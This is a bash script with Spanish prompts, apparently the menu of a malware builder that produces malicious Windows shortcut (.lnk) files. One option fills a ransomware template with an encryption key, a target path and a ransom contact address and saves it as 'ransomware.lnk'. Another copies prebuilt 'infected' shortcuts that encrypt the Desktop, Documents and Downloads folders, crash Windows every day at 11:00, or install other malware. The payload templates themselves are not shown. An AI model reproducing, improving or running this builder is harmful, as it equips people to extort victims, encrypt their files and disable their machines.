# Hacer que se pueda crear uno mismo el Lnk personalizado uwu

bash .banner
echo "Introduce la opcion a utilizar:"
echo ""
echo "1)Seleccionar LNK (Recomendado)"
echo "2)Crear LNK (Beta)"
echo "3)Ayuda"
echo "4)Salir"
echo ""
read -p "Opcion: " num



if [ "$num" = "2" ]; then
mkdir $HOME/MgToLs/lnk
bash .banner

read -p "Introduce la contraseña para cifrar los archivos: " cif

# Aqui procesamos los datos de md5

ls=$(echo "" > $cif)
cle=$(md5sum "$cif" | sed "s/$cif//g")
ks=$(rm -fr $cif)

# Fin


bash .banner
read -p "Intrduce la ruta a cifrar: " ruta


bash .banner
read -p "Introduce donde te pueden contactar: " conta

# Aqui editamos la mierda de archivo base. Help me D:

base=$(echo "$ruta" | sed 's%/%=%g')
jfhw=$(cat .lost | sed "s/ENCRY/$conta/g" > .base)
jsjs=$(cat .base | sed "s/caca/$cle/g" > .base1 ; mv .base1 .base)
fj=$(cat .base | sed "s/ruta/$base/g" > .base1 ; mv .base1 .base)

# Este es el problema xd

final=$(tr "=" '\' < .base > .base1 ; mv .base1 .base)
#ends=$(mv olas.lnk $HOME/MgToLs/lnk/ransomware.lnk)
#lab=$(echo "$jsjs" > .base )

# Fin

execute=$(bash .base)
ends=$(mv olas.lnk $HOME/MgToLs/lnk/ransomware.lnk)
bash .banner
echo "El acceso directo infectado a sido creado existosamente y guardado en:"
echo "$HOME/MgToLs/lnk/ransomware.lnk"
echo ""
read -sp "Presiona una tecla para continuar..." nana
bash DirectLnk.sh

# No basta - Franco de bita cancion (mami la dedico)
fi

if [ "$num" = "1" ]; then
mkdir $HOME/MgToLs/lnk
bash .banner
echo "1)Ransomware to: Desktop, Documents, Downloads."
echo "2)Bucle to: All days at 11:00 crash windows."
echo "3)Malware to: Desktop, Documents, Downloads."
echo ""
read -p "Introduce la opcion a utilizar: " papa
echo ""
read -p "Nombre para tu acceso directo: " nombre

if [ "1" = "1" ]; then
cp .lnk/$papa.lnk -r $HOME/MgToLs/lnk/$nombre.lnk
bash .banner
echo "El acceso directo infectado a sido creado existosamente y guardado en:"
echo "$HOME/MgToLs/lnk/$nombre.lnk"
echo ""
read -sp "Presiona una tecla para continuar..." nana
bash DirectLnk.sh
fi

fi

if [ "$num" = "3" ]; then
bash .banner
cat Readme.txt
echo ""
read -sp "Presiona una tecla para continuar..." nana
bash DirectLnk.sh
fi

if [ "$num" = "4" ]; then
bash .banner
echo "     Gracias por usar ${0}!!"
echo ""
fi
